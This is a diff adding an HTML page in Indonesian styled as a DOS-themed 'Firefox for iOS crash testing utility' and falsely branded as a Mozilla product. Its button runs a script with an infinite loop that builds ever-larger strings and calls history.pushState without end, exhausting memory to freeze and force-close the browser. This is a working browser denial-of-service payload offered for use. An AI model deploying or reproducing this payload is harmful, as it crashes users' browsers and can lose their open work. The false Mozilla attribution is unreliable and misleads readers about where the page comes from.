@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FX-DOS Browser for iOS</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap');
+
+        body {
+            background-color: #000000;
+            color: #ff9900; /* Warna oranye khas Firefox versi DOS */
+            font-family: 'Courier Prime', 'Courier New', monospace;
+            padding: 20px;
+            margin: 0;
+            user-select: none;
+        }
+
+        .dos-container {
+            border: 2px solid #ff9900;
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+            box-shadow: 0 0 15px rgba(255, 153, 0, 0.3);
+        }
+
+        .header {
+            border-bottom: 2px double #ff9900;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .url-bar {
+            border: 1px solid #ff9900;
+            padding: 5px 10px;
+            margin-bottom: 20px;
+            background-color: #110800;
+        }
+
+        .content {
+            min-height: 200px;
+            line-height: 1.6;
+        }
+
+        /* Tombol DOS */
+        .dos-btn {
+            background-color: #ff9900;
+            color: #000000;
+            border: none;
+            padding: 8px 20px;
+            font-family: 'Courier Prime', 'Courier New', monospace;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 4px 4px 0px #552200;
+            display: inline-block;
+            margin-top: 15px;
+        }
+
+        .dos-btn:hover {
+            background-color: #cc6600;
+            box-shadow: 2px 2px 0px #331100;
+        }
+
+        .blink {
+            animation: blinker 1s linear infinite;
+        }
+
+        @keyframes blinker {
+            50% { opacity: 0; }
+        }
+
+        .footer {
+            margin-top: 30px;
+            border-top: 1px solid #ff9900;
+            padding-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="dos-container">
+    <div class="header">
+        <div>MOZILLA FIREFOX(R) FOR IOS - DOS EDITION</div>
+        <div>(C) Mozilla Foundation 1998-2026.</div>
+        <div style="margin-top: 5px; font-weight: bold;">--- SYSTEM CRASH TESTING UTILITY ---</div>
+    </div>
+
+    <div class="url-bar">
+        SRC: about:crash-test-ios
+    </div>
+
+    <div class="content">
+        <p>C:\FIREFOX> load web_exploit.exe</p>
+        <p>PERINGATAN: Tombol di bawah ini dirancang untuk menguji stabilitas RAM pada Firefox iOS dengan memicu kegagalan memori (Force Close).</p>
+        <p>Pastikan Anda tidak sedang membuka tab penting lain.</p>
+        <br>
+        
+        <button class="dos-btn" onclick="paksaBerhenti()">[ CRASH FIREFOX NOW ]</button>
+    </div>
+
+    <div class="footer">
+        <span>Status: READY TO CRASH</span>
+        <br><br>
+        <span>C:\FIREFOX> <span class="blink">_</span></span>
+    </div>
+</div>
+
+<script>
+    function paksaBerhenti() {
+        alert("Memulai simulasi Force Close... Firefox akan membeku lalu keluar.");
+        
+        // Metode 1: Infinite History Push State (Sangat ampuh membuat iOS WebKit kehabisan memori)
+        var totalMemori = "";
+        while (true) {
+            // Metode 2: String concatenation tanpa batas untuk memakan sisa RAM perangkat dengan cepat
+            totalMemori += new Array(1000000).join("🔥FIREFOX-CRASH🔥");
+            window.history.pushState(null, null, window.location.href + totalMemori.length);
+        }
+    }
+</script>
+
+</body>
+</html>
